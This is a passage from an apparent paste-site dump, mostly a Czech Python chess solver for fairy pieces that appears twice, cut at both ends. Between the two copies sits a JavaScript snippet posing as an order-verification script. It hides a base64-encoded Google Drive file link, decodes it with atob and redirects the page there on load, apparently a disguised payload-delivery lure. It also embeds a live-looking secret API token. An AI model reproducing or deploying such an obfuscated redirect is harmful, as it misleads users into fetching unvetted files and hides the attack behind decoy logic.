            nr += dr; nc += dc
    
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    enemy = 'b' if side=='w' else 'w'
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády (základní verze)
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

# Zásobník pro tahy (pro undo)
move_stack = []

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.
       move: (r1, c1, r2, c2, promo, special)""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    board.grid[r1][c1] = '.'
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    board.grid[r1][c1] = piece
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    board.castling_rights, board.en_passant = prev_state
    board.to_move = 'b' if board.to_move=='w' else 'w'

###############################################################################
# Jednoduchá funkce pro zjištění, zda je mat v určité hloubce 
# (pro pomoc s detekcí matů za určitý počet tahů)
###############################################################################

def is_mate_in_n(board, side, depth):
    """"""Zkontroluje, zda je pozice mat (pro stranu side) v zadané hloubce.""""""
    if depth == 0:
        # Kontrola matu
        legal_moves = get_legal_moves(board, side)
        return not legal_moves and is_in_check(board, side)
    
    # Rekurzivní kontrola pro stranu side (zda má vynucený mat)
    legal_moves = get_legal_moves(board, side)
    
    if not legal_moves:
        return False  # Nemáme tahy, nemůžeme dát mat
    
    # Zkontrolujeme všechny tahy, musí existovat alespoň jeden, který vede k matu
    opponent = 'b' if side=='w' else 'w'
    for move in legal_moves:
        make_move(move, board)
        # Pro všechny odpovědi protivníka musí být mat
        opponent_can_avoid_mate = False
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves:
            # Protivník nemá tahy - buď je to mat nebo pat
            if is_in_check(board, opponent):
                undo_move(board)
                return True  # Již nyní máme mat
            # Jinak je to pat a to není výhra
        
        # Pokud má protivník tahy, musíme prověřit všechny
        for op_move in opponent_legal_moves:
            make_move(op_move, board)
            if not is_mate_in_n(board, side, depth-1):
                opponent_can_avoid_mate = True
            undo_move(board)
            if opponent_can_avoid_mate:
                break
        
        undo_move(board)
        
        # Pokud protivník nemůže vyhnout matu, máme mat za 'depth' tahů
        if not opponent_can_avoid_mate:
            return True
    
    return False

###############################################################################
# Negamax s alfa-beta ořezáváním pro hledání nejlepší sekvence
###############################################################################

def negamax(board, depth, alpha, beta, side):
    """"""Negamax s alfa-beta ořezáváním.
       side: 1 pro bílého, -1 pro černého.
       Vrací (hodnota, tahová sekvence).""""""
    # Koncové podmínky - mat (nebo pat když depth=0)
    curr_color = 'w' if side == 1 else 'b'
    legal_moves = get_legal_moves(board, curr_color)
    
    # Kontrola na mat nebo pat (terminální stavy)
    if not legal_moves:
        if is_in_check(board, curr_color):
            return -inf, []  # Mat
        return 0, []  # Pat
    
    # Dosáhli jsme maximální hloubky - základní ohodnocení
    if depth == 0:
        # Kontrola, zda máme mat v nejbližších tazích
        enemy_color = 'b' if curr_color == 'w' else 'w'
        for move in legal_moves:
            make_move(move, board)
            enemy_legal_moves = get_legal_moves(board, enemy_color)
                
            if not enemy_legal_moves and is_in_check(board, enemy_color):
                undo_move(board)
                return inf, [move]  # Našli jsme mat
            undo_move(board)
        
        # Pro jednoduchost zde neohodnocujeme materiál, pozici atd.
        # V reálném šachovém enginu bychom zde vraceli pozici na základě materiálu, struktury pěšců atd.
        return 0, []
    
    best_val = -inf
    best_line = []
    
    # Seřazení tahů pro alfa-beta
    legal_moves.sort(key=lambda m: 1 if board.grid[m[2]][m[3]] != '.' else 0, reverse=True)
    
    for move in legal_moves:
        make_move(move, board)
        val, line = negamax(board, depth-1, -beta, -alpha, -side)
        val = -val
        undo_move(board)
        
        if val > best_val:
            best_val = val
            best_line = [move] + line
        
        alpha = max(alpha, best_val)
        if alpha >= beta:
            break
    
    return best_val, best_line

###############################################################################
# Iterativní prohlubování – hledáme do maximální hloubky a vypisujeme uplynulý čas
###############################################################################

def iterative_deepening(board, max_depth=50, time_limit=300):
    """"""Iterativní prohlubování s časovým limitem (výchozí 5 minut).""""""
    global running, start_time
    
    # Spuštění časovacího vlákna
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()
    
    best_line = []
    best_val = 0
    
    try:
        # Nejdříve zkontrolujeme, zda máme vůbec nějaké legální tahy
        curr_side = board.to_move
        enemy_side = 'b' if curr_side=='w' else 'w'
        
        legal_moves = get_legal_moves(board, curr_side)
        
        # Pokud nemáme žádné legální tahy, je to pat nebo mat
        if not legal_moves:
            total_elapsed = time.time() - start_time
            running = False
            if is_in_check(board, curr_side):
                return -inf, [], total_elapsed  # Mat
            return 0, [], total_elapsed  # Pat
        
        # Zkontrolujeme, zda máme mat v jednom tahu
        for move in legal_moves:
            make_move(move, board)
            enemy_legal = get_legal_moves(board, enemy_side)
            
            if not enemy_legal and is_in_check(board, enemy_side):
                # Našli jsme mat v jednom tahu
                undo_move(board)
                running = False
                return inf, [move], 0.1
            undo_move(board)
        
        # Pokud máme jen jeden legální tah, vrátíme ho bez dalšího počítání
        if len(legal_moves) == 1:
            running = False
            return 0, legal_moves, 0.1
        
        # Nyní začněme iterativní prohlubování
        for depth in range(1, max_depth+1):
            t0 = time.time()
            val, line = negamax(board, depth, -inf, inf, 1 if board.to_move=='w' else -1)
            t1 = time.time()
            elapsed = time.time() - start_time
            
            # Výpis času po dosažení každé hloubky
            hrs = int(elapsed // 3600)
            mins = int((elapsed % 3600) // 60)
            secs = int(elapsed % 60)
            
            # Po výpisu každé hloubky přejdeme na nový řádek
            move_time = t1 - t0
            sys.stdout.write(""\n"")  # Nový řádek po časovém informačním řádku
            print(f""Hloubka {depth:2d} – uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s (poslední krok: {move_time:.2f}s)"")
            
            # Zobrazení aktuální nejlepší pozice pro tuto hloubku
            if line:
                print(f""\nNejlepší sekvence v hloubce {depth}:"")
                variant_board = board.copy()
                move = line[0]  # Vezmeme pouze první tah
                make_move(move, variant_board)
                print(f""Tah: {move_to_notation(move)}"")
                print(variant_board.display())
                print(""-"" * 40)
            else:
                print(""\nŽádná nalezená sekvence v této hloubce."")
            
            # Aktualizujeme nejlepší nalezenou sekvenci
            best_val = val
            best_line = line
            
            # Pokud jsme našli vynucený mat nebo pat, končíme
            if abs(val) == inf or time.time() - start_time > time_limit:
                if time.time() - start_time > time_limit:
                    print(f""Časový limit vypršel po {time_limit} sekundách"")
                break
        
        # Ověření, že když máme tahy, tak vrátíme nejlepší z nich (i když je remíza)
        if not best_line and legal_moves:
            best_line = [legal_moves[0]]
                
        total_elapsed = time.time() - start_time
        return best_val, best_line, total_elapsed
    
    finally:
        # Zajistíme ukončení časovacího vlákna
        running = False
        timer_thread.join(timeout=1.0)
        # Přejdeme na nový řádek po posledním časovém výpisu
        sys.stdout.write(""\n"")
        sys.stdout.flush()

###############################################################################
# Testovací funkce pro kontrolu, zda jsou tahy e4 správně generovány
###############################################################################

def debug_king_moves(fen=""8/8/8/8/8/kq2K3/8/8 w - - 0 1""):
    """"""Testovací funkce pro zobrazení generovaných tahů krále.""""""
    board = Board(fen)
    print(""Pozice:"")
    print(board.display())
    
    side = board.to_move
    king_pos = find_king(board, side)
    if not king_pos:
        print(""Král nenalezen!"")
        return
    
    kr, kc = king_pos
    print(f""Král na pozici: {'abcdefgh'[kc]}{8-kr} ({kr},{kc})"")
    
    # Generujeme tahy krále
    king_moves = []
    for dr in [-1, 0, 1]:
        for dc in [-1, 0, 1]:
            if dr == 0 and dc == 0:
                continue
            nr, nc = kr + dr, kc + dc
            if 0 <= nr < 8 and 0 <= nc < 8:
                king_moves.append((nr, nc))
    
    print(""Možné tahy krále:"")
    for nr, nc in king_moves:
        # Zjistíme, zda je tam vlastní figura
        piece = board.grid[nr][nc]
        enemy_side = 'b' if side == 'w' else 'w'
        attacked = is_square_attacked(board, nr, nc, enemy_side)
        
        status = """"
        if piece != '.':
            is_own = (side == 'w' and piece.isupper()) or (side == 'b' and piece.islower())
            if is_own:
                status = ""vlastní figura""
            else:
                status = f""soupeřova figura {piece}""
        
        if attacked:
            status += "" (napadeno)""
        
        if not status:
            status = ""volné pole""
        
        print(f""  {'abcdefgh'[nc]}{8-nr} ({nr},{nc}): {status}"")
    
    # Generování legálních tahů pomocí generate_pseudo_moves
    print(""\nLegální tahy podle generate_pseudo_moves:"")
    moves = generate_pseudo_moves(board, side)
    king_moves = []
    for move in moves:
        r1, c1, r2, c2, _, _ = move
        if r1 == kr and c1 == kc:
            king_moves.append(move)
    
    for move in king_moves:
        r1, c1, r2, c2, _, _ = move
        make_move(move, board)
        in_check = is_in_check(board, side)
        undo_move(board)
        
        print(f""  {'abcdefgh'[c1]}{8-r1} -> {'abcdefgh'[c2]}{8-r2}: {'nelegální (šach)' if in_check else 'legální'}"")

###############################################################################
# Převod tahu do šachové notace
###############################################################################

def move_to_notation(move):
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
    s = cols[c1] + str(8 - r1) + cols[c2] + str(8 - r2)
    if promo:
        s += ""="" + promo.upper()
    if special == 'enpassant':
        s += "" e.p.""
    return s

###############################################################################
# Analýza pozice pro určení výsledku
###############################################################################

def analyze_position(board):
    """"""Analyzuje pozici a vrací výsledek.""""""
    # Zjistíme stranu na tahu
    side_to_move = board.to_move
    
    # Zjistíme, zda má strana na tahu legální tahy
    legal_moves = get_legal_moves(board, side_to_move)
    
    # Kontrola na mat nebo pat
    if not legal_moves:
        if is_in_check(board, side_to_move):
            if side_to_move == 'w':
                return ""Mat – černý vyhrává""
            else:
                return ""Mat – bílý vyhrává""
        else:
            return ""Pat (remíza)""
    
    # Zjistíme, zda po provedení tahu bude mat
    for move in legal_moves:
        make_move(move, board)
        opponent = 'b' if side_to_move == 'w' else 'w'
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves and is_in_check(board, opponent):
            undo_move(board)
            if side_to_move == 'w':
                return ""Mat v příštím tahu – bílý vyhrává""
            else:
                return ""Mat v příštím tahu – černý vyhrává""
        undo_move(board)
    
    # Pokud nemáme ani mat ani pat, pozice je otevřená
    return ""Pozice není rozhodnuta""

###############################################################################
# Hlavní program – inicializace z FEN a výpis optimální tahové sekvence
###############################################################################

def main():
    # Nastavíme pozici ze zadaného FEN
    fen = ""8/6A1/8/8/8/k1K5/8/8 w - - 0 1""
    fen = ""8/8/8/8/8/kq2K3/8/8 w - - 0 1""

    # Další příklad pozice
    #fen = ""8/8/8/8/8/kq2K3/6A1/8 w - - 0 1""
    
    # Nejprve spustíme debug pro ověření tahů krále
    print(""DEBUG TAHŮ KRÁLE:"")
    print(""-"" * 40)
    debug_king_moves(fen)
    print(""-"" * 40)
    
    board_obj = Board(fen)
    board = board_obj.copy()
    
    print(""Počáteční pozice:"")
    print(board.display())
    print(""\nVyhledávání optimální tahové sekvence – iterativní prohlubování...\n"")
    
    # Nastavíme časový limit na 5 minut (300 sekund) a maximální hloubku na 10
    best_val, best_line, total_elapsed = iterative_deepening(board, max_depth=10, time_limit=inf)
    hrs = int(total_elapsed // 3600)
    mins = int((total_elapsed % 3600) // 60)
    secs = int(total_elapsed % 60)
    
    variant_board = board.copy()
    moves_notation = []
    print(""Postup tahů:"")
    print(""-""*40)
    print(""Start:"")
    print(variant_board.display())
    print(""-""*40)
    
    # Vykonání sekvence tahů a zobrazení průběhu
    for move in best_line:
        s = move_to_notation(move)
        moves_notation.append(s)
        make_move(move, variant_board)
        print(""Tah:"", s)
        print(variant_board.display())
        print(""-""*40)
    
    # Vyhodnocení výsledné pozice
    if best_val == inf:
        result_text = ""Mat – bílý vyhrává""
    elif best_val == -inf:
        result_text = ""Mat – černý vyhrává""
    else:
        # Pokud engine nenašel jednoznačný výsledek, analyzujeme pozici znovu
        result_text = analyze_position(variant_board)
    
    print(""Optimální tahová sekvence:"", "" "".join(moves_notation) if moves_notation else ""(žádný tah)"")
    print(""Výsledek:"", result_text)
    print(f""Celkový uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")

if __name__ == '__main__':
    main()"
FY0pM7YX,Untitled,WassupDog45,JavaScript,Tuesday 1st of April 2025 04:25:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/258/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ci2cDXF6,korektni qkK i s casem na jednom radku a inf casem a s tiskem jedne pozice,max2201111,Python,Tuesday 1st of April 2025 04:05:44 AM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Globální konstanty – pohyby jezdce (relativní souřadnice)
knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]

# Globální proměnné pro sledování času
running = False
start_time = 0

###############################################################################
# Funkce pro výpis času v samostatném vlákně
###############################################################################

def time_reporter():
    """"""Funkce pro výpis aktuálního času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        
        # Použijeme \r pro návrat na začátek řádku a přepsání předchozího výpisu
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        
        time.sleep(1)

###############################################################################
# Třída Board – reprezentuje šachovnici a umí ji inicializovat z FEN řetězce.
###############################################################################

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice; pokud je zadán FEN, nastaví pozici podle něj.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()  # např. {'K','Q','k','q'}
        self.en_passant = None       # (row, col) nebo None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        # FEN řady začínají od horní (8.) a jdou dolů
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

###############################################################################
# Funkce pro detekci šachu, generování tahů a jejich provádění
###############################################################################

def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    
    # Útoky po řadách/sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    enemy = 'b' if side=='w' else 'w'
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády (základní verze)
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
